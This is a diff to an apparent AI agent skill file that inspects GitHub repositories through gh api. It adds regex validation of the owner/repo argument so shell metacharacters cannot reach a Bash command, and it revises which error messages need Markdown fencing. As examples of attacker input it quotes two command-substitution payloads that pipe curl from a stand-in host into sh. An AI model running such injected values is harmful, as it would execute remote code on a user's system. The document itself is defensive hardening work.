@@ -37,7 +37,36 @@ Parse the input from the user's message. Accept forms like:
 
 ## Step 1: Resolve the repo and default ref
 
-Verify the repo exists and resolve the default branch if no ref was provided:
+**Validate `<owner>/<repo>` before using it anywhere.** The resolve call
+below is this skill's very first action — it interpolates the raw argument
+into a Bash `gh api` command before the argument has been confirmed to name
+a real repository. Building a `gh api "repos/<owner>/<repo>"` command line
+from an unvalidated value lets the shell resolve any backtick/`$()` inside
+it as command substitution **before** the intended command runs —
+double-quoting does not stop this. A crafted argument such as
+`` foo/`curl evil.tld|sh` `` or `foo/$(curl evil.tld|sh)` is a syntactically
+legal string for this skill's own `<owner>/<repo>` input; only the *later*
+API call would reveal it isn't a real repo, by which point the shell has
+already resolved the metacharacters.
+
+Check `<owner>` against `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$` and `<repo>`
+against `^[A-Za-z0-9._-]{1,100}$` — the same constraint `scan_repo.mjs`'s
+`OWNER_REPO_RE` enforces, and the identical check `evo/SKILL.md` Step 2,
+`security-check/SKILL.md` Step 2, `index-repos/SKILL.md` Step 2, and
+`init/references/install-protocol.md` already perform before their own
+first `gh api repos/<owner>/<repo>...` call. If either check fails, report
+`` Repository identifier '<owner>/<repo>' contains invalid characters. `` —
+`<owner>/<repo>` fenced per § Step 5's "Excerpt containment" rule (collapse
+line breaks, measure the longest backtick run, pad if it starts/ends with a
+backtick, wrap) before interpolating it into that message, since this is
+the one point in the skill where `<owner>/<repo>` renders *before* passing
+this check, not after — and exit cleanly. Do NOT interpolate an unvalidated
+value into the `gh api` call below or any later one; Step 2's tree fetch and
+Step 4a/4b's content fetches all reuse this same validated `<owner>/<repo>`,
+so this one check closes every call site in the skill.
+
+Once validated, verify the repo exists and resolve the default branch if no
+ref was provided:
 
 ```bash
 gh api "repos/<owner>/<repo>" --jq '.default_branch'
@@ -50,7 +79,15 @@ If the API call fails, report clearly based on the error:
 - **429** — `GitHub API rate limit hit. Wait a few minutes and try again.`
 - **Any other error** — report the raw error message from `gh api`, fenced per § Step 5's "Excerpt containment" rule before rendering it (collapse line breaks, measure the longest backtick run, pad if it starts/ends with a backtick, wrap) — this text originates from GitHub's own API response body for an unclassified error, not from an allowlist-validated field, so it is not assumed safe by default.
 
-Fence `<owner>/<repo>` per that same rule before interpolating it into the 404 or the 403 message. Both fire at exactly the moment the argument did NOT resolve to a real repository, so the exemption elsewhere in this file for `<owner>/<repo>` — that GitHub's own naming rules admit no Markdown metacharacter — cannot apply to them: what these two messages quote is the raw string the user supplied (typed, or pasted from an untrusted README recommending a repo), which nothing has validated against GitHub's naming rules or anything else. This is the `<owner>/<repo>` counterpart of the ref-validation-failure carve-out below. The 429 message interpolates no repo-derived value and needs no fencing.
+The 404 and 403 messages above also interpolate `<owner>/<repo>`, but need
+no extra fencing: by the time either can fire, `<owner>/<repo>` has already
+passed the charset check above, which — like GitHub's own naming rules for
+a resolved repo — admits no Markdown metacharacter. This is the same
+exemption § Step 5's "Excerpt containment" note grants every later surface;
+the validation-failure message above is the one place in this skill where
+that exemption does NOT hold, since it renders `<owner>/<repo>` at the
+moment the check just failed. The 429 message interpolates no repo-derived
+value and needs no fencing either.
 
 Exit cleanly on any failure. Do NOT retry or guess alternative names.
 
@@ -315,12 +352,14 @@ and broad-access surfaces too. The list below is exhaustive and closed:
   `default_branch`, not the user's typed argument. The error-message one
   quotes GitHub's raw API response body for an unclassified error, which is
   not an allowlist-validated field at all.
-- **Step 1's 404 and 403 messages** — both quote `<owner>/<repo>`, and both
-  fire ONLY when it did not resolve to a real repository, so the exemption
-  below for a resolved `<owner>/<repo>` cannot cover them: the string they
-  render is the raw user-supplied argument, validated by nothing. Same shape
-  of hole as the `<ref>` one above. (Step 1's 429 message interpolates no
-  repo-derived value.)
+- **Step 1's owner/repo charset-validation-failure message** — quotes
+  `<owner>/<repo>` at exactly the moment it failed the
+  `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$` / `^[A-Za-z0-9._-]{1,100}$` charset
+  check, the one site in this file where the exemption below for a
+  charset-validated `<owner>/<repo>` does not hold. Same shape of hole as
+  the `<ref>` one above. (Step 1's 404, 403, and 429 messages are NOT this
+  hole — 404 and 403 can only fire once `<owner>/<repo>` already passed this
+  check, and 429 interpolates no repo-derived value.)
 
 The remaining placeholders need no fencing, and this is the complete list of
 exemptions: every `<N>`, `<total file count>` and `<items fetched>` is a tally
@@ -330,11 +369,13 @@ time it reaches Step 5 or any surface below, which admits no Markdown
 metacharacter — the one exception is Step 1's OWN failure message, covered
 above, which by definition renders `<ref>` before or instead of that pass;
 `<owner>/<repo>` is the user's own
-argument, and every surface from Step 2 onward renders it only after Step 1
-resolved it against a real repository — GitHub's own naming rules admit no
-Markdown metacharacter either; the one exception is Step 1's OWN 404 and 403
-messages, covered above, which by definition render the argument when that
-resolution failed; and the `<skill-name>` in the
+argument, and every surface that renders it — Step 2 onward, and Step 1's
+own 404, 403, and 429 messages — does so only after Step 1's charset check
+already passed, which (like GitHub's own naming rules for a resolved repo)
+admits no Markdown metacharacter; the one exception is Step 1's OWN
+charset-validation-failure message, covered above, which by definition
+renders the argument at the moment that check just failed; and the
+`<skill-name>` in the
 **Next steps** section's `/ievo:security-check <owner>/<repo>@<skill-name>`
 line is fixed command-syntax guidance, never substituted with a
 repo-discovered skill name — the parenthetical "(e.g. `.../skills@evo` —
@@ -416,7 +457,7 @@ each side when the value begins or ends with a backtick.
 - **Truncate descriptions.** Cap at 120 characters with `...` to keep tables readable.
 - **Neutralize excerpts before they render.** Every repo-derived field interpolated into the Step 5 template is untrusted content from the target repo — on every surface, not just the tables (Scripts, Hooks, MCP Servers, Permission Footprint and the broad-access note included) — see § Step 5's "Excerpt containment" note for the exhaustive placeholder list, the fencing rule, the both-sided padding a value starting or ending with a backtick needs, and the line-break/pipe normalization a code span alone does not cover.
 - **gh CLI only.** All remote data comes from `gh api` calls. No `git clone`, no `curl`, no external tools.
-- **Never interpolate an unvalidated `<ref>` or `<path>` into a Bash command.** Both are attacker-controlled (a branch/tag name, or a path from the target repo's own tree listing) and can legally contain shell metacharacters. Validate against the allowlist in Step 1 / Step 4 first — exit cleanly (ref) or skip the item (path) on failure.
+- **Never interpolate an unvalidated `<owner>/<repo>`, `<ref>`, or `<path>` into a Bash command.** All three are attacker-controlled — a raw user-typed/pasted repo identifier not yet confirmed against GitHub's own slug charset, a branch/tag name, or a path from the target repo's own tree listing — and none is constrained until validated. Validate against the allowlist in Step 1 / Step 4 first — exit cleanly (owner/repo, ref) or skip the item (path) on failure.
 
 ## See also
 
